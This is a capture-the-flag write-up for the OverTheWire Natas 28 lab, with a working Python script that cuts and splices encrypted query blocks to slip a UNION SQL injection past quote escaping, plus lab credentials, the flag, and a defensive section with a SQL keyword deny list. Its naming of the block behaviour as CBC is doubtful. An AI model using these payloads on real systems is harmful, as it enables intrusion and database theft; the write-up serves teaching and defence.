# OverTheWire

# NATAS28

## Web/Cryptography: CBC Byte Flipping Attack and SQL Injection

## Description
Not description provided

## Files
> This challenge did not provide files, only the description.

---

## Analysis

We can see it's a simple joke search engine.

<img width="1425" height="910" alt="web_normal" src="https://github.com/user-attachments/assets/1b720778-6b03-4c9a-9ccf-810157df2394" />

The URL is extremely unusual and long for a normal search URL, which made me initially suspect a simple SQL injection attack. However, I was wrong - this turned out to be a difficult level in my opinion.

```url
http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKriAqPE2%2B%2BuYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D
```

As I mentioned, if we insert a quote or play with special characters in the URL, we get this warning:

**Understanding PKCS#7 Padding:**

PKCS#7 is a padding standard used in block cipher encryption algorithms. Since block ciphers like AES work with fixed-size blocks (typically 16 bytes for AES-128), any data that doesn't fit exactly into these blocks needs to be padded. PKCS#7 adds bytes to fill the remaining space, where each padding byte's value equals the number of bytes added. For example, if 5 bytes of padding are needed, five bytes with value 0x05 are added.

This challenge uses CBC (Cipher Block Chaining) mode with AES encryption. In CBC mode, each plaintext block is XORed with the previous ciphertext block before encryption, creating a chain where each block depends on all previous blocks. This is what allows us to perform a byte flipping attack.

<img width="1439" height="545" alt="padding_problem" src="https://github.com/user-attachments/assets/aeed97e4-6db9-435e-96e0-8cd72ac4faac" />

Additionally, when we tried normal SQL injection, it simply didn't work because the server protects against dangerous characters. When you input something like `' or 1=1 -- #`, the server escapes it to something like `\' or 1=1 -- #` by adding a backslash, converting it into a safe string rather than executable SQL syntax. If you tried it normally without manipulating the URL, it simply showed nothing and returned an encrypted URL.

```request
input: hola' or 1=1 -- 
```
<img width="1550" height="525" alt="sql_normal" src="https://github.com/user-attachments/assets/f8b88971-a944-4e41-8a72-bd21df5e1117" />

After experimenting, I realized this isn't about decrypting or guessing the private key (which might be possible, but there's a better and easier way).

We need to find a way to escape the quote and inject it into the encrypted text or URL. This is where understanding CBC mode becomes critical - we can manipulate the blocks to remove the escaping backslash.

---

## Theory

To solve this challenge you need to understand:
- **SQL Injection**
- **CBC (Cipher Block Chaining) Mode**
- **PKCS#7 Padding**
- **Block Cipher Cryptography**
- **Byte Manipulation in Hex**
- **URL Encoding/Decoding**
- **Base64 Encoding/Decoding**
- **Patience** ;)

---

## Solution

### Step 1: Determining Block Size and Padding Structure

First, we need to understand the padding mechanism, which was the most time-consuming part for me. Without understanding this, we wouldn't know where blocks start and end. Using Python and requests, we create a function to determine the block size.

The initial block length is 160 characters. When we add more characters, specifically every 16 characters, the length increases from 160 to 192. If we subtract these values (192 - 160 = 32), then divide by 2 (32/2 = 16), we get 16 bytes. So the padding is 16 bytes. This means if our text is 4 characters (4 bytes), it will be padded with 12 bytes of filler data to reach the required 16-byte block size.

Once we know this, we need to examine the blocks using different characters. I used the letter 'A' (uppercase) to fill the blocks, but any character works. We notice that the first and second blocks repeat:

```bash
==================================
++++++++++++   5   *************
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
4b934c5d11aac887e32f4e457ad5396f
ac3b871c1c448386b45cd36d9e8f72f4
655149bbba2123d89d95417ea27f3a7b

==================================
++++++++++++   6   *************
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
7e0d979d48942ac2b657f6d7d418ced6
41c098c4bacdc5ed9357564e5105dd7e
64d0dcc868253692adfcbd3796d1bf8a
```

Observing the output (after URL decoding and Base64 to hex conversion), we notice the first two lines of both blocks are identical:

```bash
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
``` 

This confirms we're dealing with CBC mode. We can see where and when blocks start by observing more repetitions. For example, with more characters, we can see the blocks fill up:

```bash
==================================
++++++++++++   18   *************
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
5f22a727f625419a466f9af53891f9b2
a7b4895bf7fbb71dc09b3417738fd678
48799a07b1d29b5982015c9355c2e00e
aded9bdbaca6a73b71b35a010d2c4c57

==================================
++++++++++++   19   *************
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
5f22a727f625419a466f9af53891f9b2
870091363eff9125f698cd2ed50bfd28
9a2e2b5db6f31f19a14f75678eadaa90
4249b93e4dea0909479995b9c44b351a
```

Here we see the first three blocks are identical, indicating that these hex values represent a string of many 'A's (19 and 18 respectively):

```bash
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
5f22a727f625419a466f9af53891f9b2
```

**This is extremely important because we now know where and how blocks change and when a new padding block is created.** Understanding this block boundary is crucial for what comes next.

### Step 2: Identifying Block Boundaries and Special Character Escaping

Knowing where new padding blocks are created, I discovered something critical: each new block is created every 16 bytes, but we need to know the exact position where a new block begins so we can identify where our input (in this case, the 'A' characters) starts.

```bash
==================================
++++++++++++   8   *************
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
cd43a47166c63b50f45ee728b271f522
896de90884f86108b167f8b4aea5d763
917232051483e68e458fd066167b30a3

==================================
++++++++++++   9   *************
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
8816c61e2bc6372660f879c45f23777e
a09522f301cf9d36ac7023f165948c5a
9739cd90522fa7a86f95773b56f9f8c0

==================================
++++++++++++   10   *************
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
5f22a727f625419a466f9af53891f9b2
738a5ffb4a4500246775175ae596bbd6
f34df339c69edce11f6650bbced62702

==================================
++++++++++++   11   *************
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
5f22a727f625419a466f9af53891f9b2
36336947ddff073d132c22391e655108
ca8cf4e610913abae39a067619204a5a
```

We can see that with 8 and 9 characters, the third block shows slight variations - these are 8 and 9 consecutive 'A's:

```bash
==================================
++++++++++++   8   *************
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
cd43a47166c63b50f45ee728b271f522

==================================
++++++++++++   9   *************
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
8816c61e2bc6372660f879c45f23777e
```

But here's where it changes - at 10 and beyond, we know we have a complete block of 'A's, and from position 10 onwards the pattern changes, showing us exactly where blocks end and where we can inject new content:

```bash
==================================
++++++++++++   10   *************
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
5f22a727f625419a466f9af53891f9b2

==================================
++++++++++++   11   *************
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
5f22a727f625419a466f9af53891f9b2
```

As we can see, they're identical. This is extremely important because now we'll move to creating new blocks, which is crucial since we know that every 16 bytes creates a new block. In this case, I use 12 characters because 4 bytes at the beginning are occupied by the server.

This is important because, as I mentioned earlier, whenever you input a special character, the server adds a backslash to escape it for security: `\'` or `1=1 -- `. We can verify this by testing various special characters. If we input these characters and iterate through them, we see they escape at position 13 while normal characters stay at position 12 (the block boundary):

```python
SPECIAL_CHARS = ['A', '\'', '"', '\\', '/', '#', '?', '%']
for char in SPECIAL_CHARS:
    length, _ = block_size("A" * 11 + char)
    print(f"{char:<10} | {length:<10}")
```

The output shows which characters are escaped:

```bash
==================================
SPECIAL CHARACTERS
A          | 160       
'          | 192       
"          | 192       
\          | 192       
/          | 160       
#          | 160       
?          | 160       
%          | 160       
==================================
```

### Step 3: Understanding the CBC Byte Flipping Attack

This is critically important because if we understand what happens here and how the escaping works, we can exploit this vulnerability. By knowing where a block ends and a new one begins, we can remove that annoying backslash. Let me explain: when we create a block with a malicious SQL injection payload, we can remove the backslash by slicing (cutting) the encrypted blocks and moving the escaped part to a new, non-malicious block. This effectively bypasses the escaping, allowing our SQL injection to execute.

### Step 4: Crafting the Malicious Payload

With Python, we create the following payload. I use 9 'A's because we know that at position 10, a new block begins, which allows us to perform the escape:

```python
#####BAD PART
sql_i = "A" * 9 + '\'' + "UNION SELECT ALL password FROM users; -- "
print(f"Len del sqli: {len(sql_i)}")
length, bad_block = block_size(sql_i)
```

Output:

```bash
==================================
++++++++++++   Bad_block   *************
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
16276a702e32b177475d890ddad5ce65
3969c875173e18cc41960094f0c831d1
8aba8813bab1684a8b2a40f10f809a64
43066d6be0d5471500101dd48d93d719
29287f3cc5479e12e66f31c863b18047
56d5732dc8c770f64397158bc17a6e66
```

Now we know our text without the backslash starts from the 4th block onwards. We extract this and paste it into a new block like this:

```bash
==================================
++++++++++++   Malicious part   *************
3969c875173e18cc41960094f0c831d1
8aba8813bab1684a8b2a40f10f809a64
43066d6be0d5471500101dd48d93d719
29287f3cc5479e12e66f31c863b18047
56d5732dc8c770f64397158bc17a6e66

==================================
++++++++++++   Clean_block   *************
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
5f22a727f625419a466f9af53891f9b2
738a5ffb4a4500246775175ae596bbd6
f34df339c69edce11f6650bbced62702

==================================
++++++++++++   Clean_part   *************
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
5f22a727f625419a466f9af53891f9b2

==================================
++++++++++++   PAYLOAD   *************
1be82511a7ba5bfd578c0eef466db59c
dc84728fdcf89d93751d10a7c75c8cf2
5f22a727f625419a466f9af53891f9b2
3969c875173e18cc41960094f0c831d1
8aba8813bab1684a8b2a40f10f809a64
43066d6be0d5471500101dd48d93d719
29287f3cc5479e12e66f31c863b18047
56d5732dc8c770f64397158bc17a6e66
```

### Step 5: Encoding and Exploiting

We then reverse the encoding process: Hex → Base64 → URL encode, which gives us the payload to insert into the query URL:

```bash
--- URL PAYLOAD FINAL ---
G%2BglEae6W/1XjA7vRm21nNyEco/c%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyOWnIdRc%2BGMxBlgCU8Mgx0Yq6iBO6sWhKiypA8Q%2BAmmRDBm1r4NVHFQAQHdSNk9cZKSh/PMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY%3D

http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W/1XjA7vRm21nNyEco/c%2BJ2TdR0Qp8dcjPJfIqcn9iVBmkZvmvU4kfmyOWnIdRc%2BGMxBlgCU8Mgx0Yq6iBO6sWhKiypA8Q%2BAmmRDBm1r4NVHFQAQHdSNk9cZKSh/PMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY%3D
```

Perfect! This gives us the flag:

<img width="1433" height="639" alt="flag" src="https://github.com/user-attachments/assets/ce98be20-2275-483f-a384-d2c5aaf63b04" />

### BONUS: Complete Script

```python
import requests
import threading
from urllib.parse import unquote
from urllib.parse import quote
import base64

LEVEL = 28
URL = f"http://natas{LEVEL}.natas.labs.overthewire.org/index.php"
B64_PASSWORD = "Basic bmF0YXMyODoxSk53UU0xT2k2SjZqMWs0OVh5dzdaTjZwWE1RSW5Wag=="
HEADERS = {"Authorization": B64_PASSWORD}

def block_size(payload):
    response = requests.post(URL, headers=HEADERS, data={"query":payload})
    requests_url = response.url

    if "query" in requests_url:
        url_enode = requests_url.split("query=")[1]
        b64_text = unquote(url_enode)
        ciphertext = (base64.b64decode(b64_text)).hex()
        
        return len(ciphertext), ciphertext
    return 0, ""

def print_hex_blocks(len_block, blocks):
    for i in range(len_block // 32):
        block = blocks[(i * 32):(i * 32 + 32)]
        print(block)


###############MAIN######################
#response = requests.post(URL, headers=HEADERS, data={"query":"A"})

########To view the block size and the letters and hopping

'''for i in range(1, 150):
    length, _ = block_size("A" * i)
    print(f"{i:<10} | {length:<10}")'''

###Thanks to the above block we know it has a block size of 32 bytes with 16-byte jumps


#######View the program 
'''SPECIAL_CHARS = ['A', '\'', '"', '\\', '/', '#', '?', '%']
for char in SPECIAL_CHARS:
    length, _ = block_size("A" * 11 + char)
    print(f"{char:<10} | {length:<10}")
'''



'''for i in range(0, 47):
    print(f"==================================")
    print(f"++++++++++++   {i}   *************")
    length, block = block_size("A" * i)
    print_hex_blocks(length, block)
    print()'''

response = requests.post(URL, headers=HEADERS, data={"query":"A" * 11 + '\'' + "UNION ALL SELECT password FROM users; # -- "})
requests_url = response.url

if "query" in requests_url:
        url_enode = requests_url.split("query=")[1]
        b64_text = unquote(url_enode)
        ciphertext = (base64.b64decode(b64_text)).hex()

#####BAD PART
sql_i = "A" * 9 + '\'' + "UNION SELECT ALL password FROM users; -- "
print(f"Len del sqli: {len(sql_i)}")
length, bad_block = block_size(sql_i)
print(f"==================================")
print(f"++++++++++++   Bad_block   *************")
print_hex_blocks(length, bad_block)
MALICIUS_PART = bad_block[32 * 3:]
print()
print(f"==================================")
print(f"++++++++++++   Malicious part   *************")
print_hex_blocks(len(MALICIUS_PART), MALICIUS_PART)
print()

###GOOD PART
length, clean_block = block_size("A" * 10)
print(f"==================================")
print(f"++++++++++++   Clean_block   *************")
print_hex_blocks(length, clean_block)
CLEAN_PART = clean_block[:32 * 3]
print()
print(f"==================================")
print(f"++++++++++++   Clean_part   *************")
print_hex_blocks(len(CLEAN_PART), CLEAN_PART)
print()
PAYLOAD = CLEAN_PART + MALICIUS_PART
print(f"==================================")
print(f"++++++++++++   PAYLOAD   *************")
print_hex_blocks(len(PAYLOAD), PAYLOAD)

####Final part
print("\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
# Convert the hexadecimal string to actual bytes
# Make sure to use the same variable name (PAYLOAD)
bytes_r = bytearray.fromhex(PAYLOAD)

# Encode to Base64 the BYTES, not text in quotes
B64_PAYLOAD = base64.b64encode(bytes_r)

# Convert from Python bytes object to string
b64_string = B64_PAYLOAD.decode('utf-8')

# Apply quote for special URL characters
FINAL_PAYLOAD = quote(b64_string)

print("\n--- URL PAYLOAD FINAL ---")
print(FINAL_PAYLOAD)

#####Tests
length, _ = block_size("A" * 11 + '\'')
print(f"\n{"char":<10} | {length:<10}")
```

**MACHINE PWNED!** :)

---

## Flag
> **31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns**

---

## How to avoid

To prevent CBC byte flipping attacks and SQL injection vulnerabilities like this, implement the following security measures:

### 1. **Use Authenticated Encryption (AEAD)**
CBC mode alone doesn't provide authentication, making it vulnerable to tampering and byte flipping attacks. Use authenticated encryption modes instead:

```python
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os

def secure_encrypt(plaintext, key):
    """
    Use AES-GCM (authenticated encryption) instead of CBC
    """
    aesgcm = AESGCM(key)
    nonce = os.urandom(12)  # 96-bit nonce for GCM
    
    # GCM provides both encryption AND authentication
    ciphertext = aesgcm.encrypt(nonce, plaintext.encode(), None)
    
    return nonce + ciphertext  # Prepend nonce to ciphertext

def secure_decrypt(data, key):
    """
    Decrypt and verify authenticity
    """
    aesgcm = AESGCM(key)
    nonce = data[:12]
    ciphertext = data[12:]
    
    try:
        plaintext = aesgcm.decrypt(nonce, ciphertext, None)
        return plaintext.decode()
    except Exception:
        # Authentication failed - data was tampered with
        raise ValueError("Decryption failed: data has been tampered with")
```

### 2. **Use Parameterized Queries (Prepared Statements)**
Never concatenate user input into SQL queries. Always use parameterized queries:

```python
import mysql.connector

# INSECURE - Vulnerable to SQL injection
def insecure_search(user_input):
    query = f"SELECT * FROM jokes WHERE content LIKE '%{user_input}%'"
    cursor.execute(query)
    return cursor.fetchall()

# SECURE - Using parameterized queries
def secure_search(user_input):
    query = "SELECT * FROM jokes WHERE content LIKE %s"
    # The database driver handles escaping automatically
    cursor.execute(query, (f"%{user_input}%",))
    return cursor.fetchall()

# Even better - using ORM like SQLAlchemy
from sqlalchemy import create_engine, Column, String, Integer
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker

Base = declarative_base()

class Joke(Base):
    __tablename__ = 'jokes'
    id = Column(Integer, primary_key=True)
    content = Column(String)

def orm_search(session, user_input):
    # Automatically parameterized
    return session.query(Joke).filter(
        Joke.content.like(f"%{user_input}%")
    ).all()
```

### 3. **Implement Proper Input Validation**
Validate and sanitize all user input before processing:

```python
import re
from typing import Optional

def validate_search_query(query: str, max_length: int = 100) -> Optional[str]:
    """
    Validate search input before use
    """
    if not query or len(query) > max_length:
        return None
    
    # Allow only alphanumeric and basic punctuation
    if not re.match(r'^[a-zA-Z0-9\s\.,!?-]+$', query):
        return None
    
    # Remove any potential SQL keywords (defense in depth)
    dangerous_keywords = [
        'UNION', 'SELECT', 'INSERT', 'UPDATE', 'DELETE',
        'DROP', 'CREATE', 'ALTER', 'EXEC', 'EXECUTE',
        '--', ';', '/*', '*/', 'xp_', 'sp_'
    ]
    
    query_upper = query.upper()
    for keyword in dangerous_keywords:
        if keyword in query_upper:
            return None
    
    return query
```

### 4. **Don't Use Encryption for Integrity**
If you need to protect data integrity (prevent tampering), use HMAC or digital signatures:

```python
import hmac
import hashlib
from base64 import b64encode, b64decode

def create_signed_token(data: str, secret_key: bytes) -> str:
    """
    Create a tamper-proof token using HMAC
    """
    # Create signature
    signature = hmac.new(
        secret_key,
        data.encode(),
        hashlib.sha256
    ).digest()
    
    # Combine data and signature
    token = b64encode(data.encode() + signature).decode()
    return token

def verify_signed_token(token: str, secret_key: bytes) -> Optional[str]:
    """
    Verify token hasn't been tampered with
    """
    try:
        decoded = b64decode(token)
        data = decoded[:-32]  # SHA256 = 32 bytes
        received_signature = decoded[-32:]
        
        # Compute expected signature
        expected_signature = hmac.new(
            secret_key,
            data,
            hashlib.sha256
        ).digest()
        
        # Constant-time comparison to prevent timing attacks
        if hmac.compare_digest(received_signature, expected_signature):
            return data.decode()
        return None
    except Exception:
        return None
```

### 5. **Use Secure Random IVs and Keys**
Always generate cryptographically secure random values:

```python
import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def generate_secure_key(key_size: int = 32) -> bytes:
    """
    Generate cryptographically secure random key
    """
    return os.urandom(key_size)  # Use os.urandom, not random module

def encrypt_with_cbc_properly(plaintext: bytes, key: bytes) -> tuple:
    """
    If you MUST use CBC, do it correctly
    """
    # Generate random IV for each encryption
    iv = os.urandom(16)
    
    # Apply PKCS7 padding
    padding_length = 16 - (len(plaintext) % 16)
    padded_plaintext = plaintext + bytes([padding_length] * padding_length)
    
    # Encrypt
    cipher = Cipher(
        algorithms.AES(key),
        modes.CBC(iv),
        backend=default_backend()
    )
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(padded_plaintext) + encryptor.finalize()
    
    # IMPORTANT: Add HMAC for authentication
    import hmac
    import hashlib
    mac = hmac.new(key, iv + ciphertext, hashlib.sha256).digest()
    
    return iv, ciphertext, mac
```

### 6. **Implement Defense in Depth**
```python
class SecureSearchAPI:
    """
    Secure search implementation with multiple layers of defense
    """
    
    def __init__(self, db_connection, encryption_key, hmac_key):
        self.db = db_connection
        self.encryption_key = encryption_key
        self.hmac_key = hmac_key
        self.max_query_length = 100
        self.rate_limiter = RateLimiter()
    
    def search(self, encrypted_query: str, user_ip: str) -> list:
        # Layer 1: Rate limiting
        if not self.rate_limiter.check(user_ip):
            raise Exception("Rate limit exceeded")
        
        # Layer 2: Decrypt with authentication
        try:
            query = self.decrypt_and_verify(encrypted_query)
        except Exception:
            raise Exception("Invalid query - tampering detected")
        
        # Layer 3: Input validation
        validated_query = self.validate_input(query)
        if not validated_query:
            raise Exception("Invalid search query")
        
        # Layer 4: Parameterized query
        results = self.execute_safe_query(validated_query)
        
        # Layer 5: Output encoding
        return self.encode_results(results)
    
    def decrypt_and_verify(self, encrypted_data: str) -> str:
        # Use AEAD or HMAC verification
        # Reject if authentication fails
        pass
    
    def validate_input(self, query: str) -> Optional[str]:
        # Whitelist validation
        # Length checks
        # Pattern matching
        pass
    
    def execute_safe_query(self, query: str) -> list:
        # Use parameterized queries
        # Principle of least privilege on DB user
        pass
```

### 7. **Security Best Practices Summary**

- **Never use CBC without authentication** - Use GCM, CCM, or add HMAC
- **Always use parameterized queries** - Never concatenate SQL
- **Validate all input** - Use allowlists, not blocklists
- **Use secure random sources** - os.urandom(), not random module
- **Implement rate limiting** - Prevent brute force attacks
- **Apply principle of least privilege** - Database users should have minimal permissions
- **Keep cryptographic libraries updated** - Use well-tested implementations
- **Log security events** - Monitor for attack patterns

### Example Secure Implementation:

```python
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import sqlite3
import os
import re
from base64 import b64encode, b64decode

class SecureJokeSearch:
    def __init__(self, db_path: str):
        self.db = sqlite3.connect(db_path)
        self.encryption_key = os.urandom(32)  # AES-256
        
    def create_search_token(self, query: str) -> str:
        """
        Create encrypted, authenticated search token
        """
        # Validate input first
        if not self._validate_query(query):
            raise ValueError("Invalid search query")
        
        # Use AEAD for encryption + authentication
        aesgcm = AESGCM(self.encryption_key)
        nonce = os.urandom(12)
        
        ciphertext = aesgcm.encrypt(
            nonce,
            query.encode(),
            None
        )
        
        # Return base64-encoded token
        token = b64encode(nonce + ciphertext).decode()
        return token
    
    def search_with_token(self, token: str) -> list:
        """
        Execute search using encrypted token
        """
        try:
            # Decode and decrypt
            data = b64decode(token)
            nonce = data[:12]
            ciphertext = data[12:]
            
            aesgcm = AESGCM(self.encryption_key)
            query = aesgcm.decrypt(nonce, ciphertext, None).decode()
            
        except Exception:
            raise ValueError("Invalid or tampered token")
        
        # Double-check validation after decryption
        if not self._validate_query(query):
            raise ValueError("Invalid query after decryption")
        
        # Execute safe parameterized query
        cursor = self.db.cursor()
        cursor.execute(
            "SELECT * FROM jokes WHERE content LIKE ?",
            (f"%{query}%",)
        )
        
        return cursor.fetchall()
    
    def _validate_query(self, query: str) -> bool:
        """
        Strict input validation
        """
        if not query or len(query) > 100:
            return False
        
        # Only allow alphanumeric and basic punctuation
        if not re.match(r'^[a-zA-Z0-9\s\.,!?-]+$', query):
            return False
        
        return True

# Usage
search_engine = SecureJokeSearch("jokes.db")
token = search_engine.create_search_token("funny cat")
results = search_engine.search_with_token(token)
```

### References:
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP Cryptographic Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-649: Insufficient Cryptographic Data Integrity](https://cwe.mitre.org/data/definitions/649.html)
- [NIST Guidelines on Authenticated Encryption](https://csrc.nist.gov/publications/detail/sp/800-38d/final)

---

> **Author:** Jose Antonio Villafaña Montes de Oca
